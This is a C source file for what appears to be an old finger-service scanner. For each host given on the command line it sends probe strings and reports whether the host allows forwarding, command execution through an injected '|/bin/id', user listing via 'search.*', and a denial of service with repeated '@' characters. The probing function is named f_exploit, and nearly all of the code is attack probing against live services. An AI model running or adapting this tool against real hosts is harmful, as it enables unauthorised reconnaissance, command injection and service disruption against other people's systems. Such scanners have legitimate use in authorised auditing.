#include "net.h"




void f_exploit(int sockfd, char buf[20], char *sbuf) {

	char str[25];

	memset((char *)sbuf, 0, 5000);
	sprintf(str, "%s\n\r", buf);
	if (sock_write(sockfd, str, sizeof(str)) < 0) {
		perror("sock_write");
		exit(1);
	}
	if (sock_read(sockfd, sbuf, 5000) < 0) {
		perror("sock_read");
		exit(1);
	}
}


	

int finscan(char **host)
{

	int sockfd;
	char *sbuf;
	int index;


	 
	if ((sbuf = malloc(5000)) == NULL) {
		printf("memory allocation failure.\n");
		exit(1);
	}

	for (index=0; host[index]!=NULL; index++) { 


		if ((sockfd = f_connect(host[index])) == 1) {
			fprintf(stderr,"%s: Finger service not found.\n", host[index]);
			return;
		}
		else { 
			fprintf(stderr, "%s: Finger service detected.\n\n", host[index]);
		}


		f_exploit(sockfd, "@", sbuf);
	/*	fprintf(stderr, "-%s-\n", sbuf); */
		if (strstr(sbuf, FIN_NEEDLE1) == NULL) {
			fprintf(stdout, "%s: Finger forwarding allowed.\n", host[index]); 
		} else { 
			fprintf(stdout, "%s: Finger forwarding not allowed.\n", host[index]); 
		}
		close(sockfd);
	
	
	
		if ((sockfd = f_connect(host[index])) == 1) {
			exit(1);
		}
		f_exploit(sockfd, "|/bin/id", sbuf);
		if (strstr(sbuf, FIN_NEEDLE2) != NULL) {
			fprintf(stdout, "%s: Command execution allowed.\n", host[index]);
		} else { 
			fprintf(stdout, "%s: Command execution not allowed.\n", host[index]); 
		}
		close(sockfd);

	
		if ((sockfd = f_connect(host[index])) == 1) {
			exit(1);
		}
		f_exploit(sockfd, "search.*", sbuf);
		if (strstr(sbuf, FIN_NEEDLE3) != NULL) {
			fprintf(stdout, "%s: User list displayed.\n", host[index]);
		} else { 
		fprintf(stdout, "%s: Users remain hidden.\n", host[index]); 
		}
		close(sockfd);
	
	
		if ((sockfd = f_connect(host[index])) == 1) {
			exit(1);
		}
		f_exploit(sockfd, "@@@@@@@@@", sbuf);
		if (strstr(sbuf, FIN_FAIL) == NULL) {
			if (strstr(sbuf, FIN_NEEDLE1) == NULL) {
				fprintf(stdout, "%s: Finger DoS open.\n", host[index]);
			}
		} else {
			fprintf(stdout,"%s: Finger not DoS'able.\n", host[index]); 
		}
		close(sockfd);
	}

}
	



main (int argc, char **argv) {


	printf("canning %s\n", argv[1]);
	finscan(argv);
}
